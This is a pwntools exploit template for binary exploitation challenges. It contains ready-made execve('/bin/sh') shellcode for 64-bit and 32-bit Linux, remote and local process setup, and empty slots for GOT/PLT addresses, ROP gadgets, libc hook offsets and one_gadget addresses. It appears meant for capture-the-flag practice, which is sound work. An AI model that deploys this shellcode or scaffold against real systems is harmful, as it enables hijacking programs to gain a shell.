#!/usr/bin/env python

import sys
import time
import string
import argparse
from pwn import *
from ctypes import *

# ============================================================== #
# ========================== SETTINGS ========================== #
# ============================================================== #

context.arch = 'amd64' # [ amd64 | i386 ]
context.os = 'linux'
context.endian = 'little'
context.word_size = 64 # [ 64 | 32]
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'
context.terminal = ['tmux','splitw','-h']

# ============================================================== #
# ========================== TEMPLATE ========================== #
# ============================================================== #

SHELLCODE64 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # 27bytes len
SHELLCODE32 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # 23bytes len
WORD32 = 'A'*4    # 32bit
WORD64 = 'X'*8   # 64bit
payload = ''
data = ''

program_name = './a.out'
binary = ELF(program_name)

remote_server = '127.0.0.1'
PORT = 1337

parser = argparse.ArgumentParser(description='Exploit the bins.')
parser.add_argument('--dbg'   , '-d', action="store_true")
parser.add_argument('--remote', '-r', action="store_true")
parser.add_argument('--lib', '-l', action="store_true")
parser.add_argument('--ssh', '-s', action="store_true")
args = parser.parse_args()

if args.remote:
    p = remote(remote_server, PORT)

elif args.ssh:
    ssh = pwn.ssh('username', 'machine', ssh_agent=True)
    output = ssh('/bin/ls /').decode()

else:
    # know libc
    if args.lib:
        if context.arch == 'amd64':
            libc_native = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        p = process(program_name, env={'LD_PRELOAD' : libc.path})
    # don't know libc
    else:
        if context.arch == 'amd64':
            libc_native = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        p = process(program_name)

if args.dbg:
    gdb.attach(p, '''
    vmmap
    b *main
    ''')

# ============================================================== #
# ================= OFFSETS & GADGETS & MAGIC ================== #
# ============================================================== #

# ============ PLT =========== #

__cxa_finalize_PLT = 0x0
puts_PLT = 0x0

# ============ GOT =========== #

__libc_start_main_GOT = 0x0
_ITM_deregisterTMCloneTable_GOT = 0x0
__gmon_start___GOT = 0x0
_ITM_registerTMCloneTable_GOT = 0x0
__cxa_finalize_GOT = 0x0
puts_GOT = 0x0

# ============ BINARY GADGETS =========== #

pop_rbp = 0x0 # pop rbp; ret; 
pop_rbp = 0x0 # pop rbp; ret; 

# ============ LIBC OFFSETS =========== #

__cxa_finalize_off = 0x0
puts_off = 0x0

# ============ MAGIC =========== #

mal_hook_off = 0x0
free_hook_off = 0x0
system_off = 0x0
binsh_off = 0x0

# ============ ONE GADGETS =========== #

one_gag = [ 0 ] 


# ============================================================== #
# ====================== USEFUL FUNCTIONS ====================== #
# ============================================================== #

sl = p.sendline
sla = p.sendlineafter
sa = p.sendafter
s = p.send

def get_symbols(y):
    x = p32(binary.symbols[y])
    return x
    # Example: read_got = p32(binary.symbols["read"])

def get_libc_offset(x):
    off = libc.symbols[x]
    return off

def search_binsh():
    return libc.search("/bin/sh").next()

# ============ GDB =========== #
def debug():
    gdb.attach(p,'''
    
    ''')

# ============================================================== #
# ====================== FLOW OF PROGRAM ======================= #
# ============================================================== #

if __name__ == "__main__":




    p.interactive()

# ============================================================== #
# =========================== NOTES ============================ #
# ============================================================== #
